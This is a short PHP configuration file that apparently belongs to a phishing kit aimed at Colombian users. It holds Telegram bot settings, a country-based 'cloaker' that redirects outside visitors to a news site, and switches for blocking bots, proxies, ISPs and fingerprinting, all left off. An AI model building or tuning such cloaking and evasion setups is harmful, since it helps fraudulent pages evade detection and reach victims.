<?php

return [
    'config' => [

        // Telegram true | false
        'id' => env('TELEGRAM_CHAT_ID', ''),
        'key' => env('TELEGRAM_BOT_TOKEN', ''),
        'tg' => false,

        // Cloacker true | false
        'comprobate_country' => false,
        'countries_allowed' => ['CO'],
        'url' => 'https://clarin.com/',

        // Antiflood true | false
        'blocker' => false,

        // Antibots 1 | 0
        'EYEZ' => 0,

        // Guardian (config avanzada) on | off
        'anti_bots' => 'off',
        'anti_ua' => 'off',
        'anti_hn' => 'off',
        'anti_isp' => 'off',
        'anti_fingerprints' => 'off',
        'anti_proxy' => 'off',

        // Mobile Detect true | false
        'mobile_detect' => false
    ],
];
